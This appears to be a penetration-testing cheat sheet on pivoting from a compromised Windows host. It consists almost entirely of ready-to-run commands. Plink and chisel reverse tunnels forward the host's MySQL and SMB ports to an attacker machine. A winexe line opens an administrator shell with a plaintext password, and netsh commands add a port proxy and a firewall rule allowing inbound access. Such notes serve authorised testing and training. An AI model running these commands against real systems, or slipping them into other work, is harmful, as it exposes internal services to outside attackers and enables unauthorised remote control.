1) Plink
```cmd
# Basic Port forwarding
plink.exe -l root -pw toor -N -R 8080:127.0.0.1:8080 [attack_box_ip]

## This says: Take localhost port 8080 and forward it to port 8080 on our attacker machine.

# Password authentication
echo 'y' | .\plink.exe -ssh -l root -pw toor -batch -N -R 127.0.0.1:33060:127.0.0.1:3306 attack-box-ip

# Private key authentication
echo 'y' | .\plink.exe -ssh -l username -i C:\Windows\Temp\key.pem -batch -N -R 127.0.0.1:33060:127.0.0.1:3306 attack-box-ip

# Multiple port forwards
echo 'y' | .\plink.exe -ssh -l username -i C:\Windows\Temp\key.pem -batch -N -R 127.0.0.1:33060:127.0.0.1:3306 -R 127.0.0.1:4445:127.0.0.1:445 attack-box-ip
```

2) Chisel
```sh
chisel server -p 8000 --reverse
```
```cmd
.\chisel.exe client [attacker-ip]:80 R:445:127.0.0.1:445
```

After Port Forwarding, run commands on the Windows server using `winexe`:-
```sh
winexe -U 'Administrator%s3cr3t' //192.168.1.225 "cmd.exe"
```

3) netsh (Requires administrator privileges)
```cmd
# Connect port 22 & open listener on port 2222
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

# Check if port has been forwarded
netsh interface portproxy show all
Address         Port        Address         Port
--------------- ----------  --------------- ----------
192.168.50.64   2222        10.4.50.215     22

# Modify firewall configuration to allow inbound connection on 2222
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow

# Delete the rule & the port forward
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```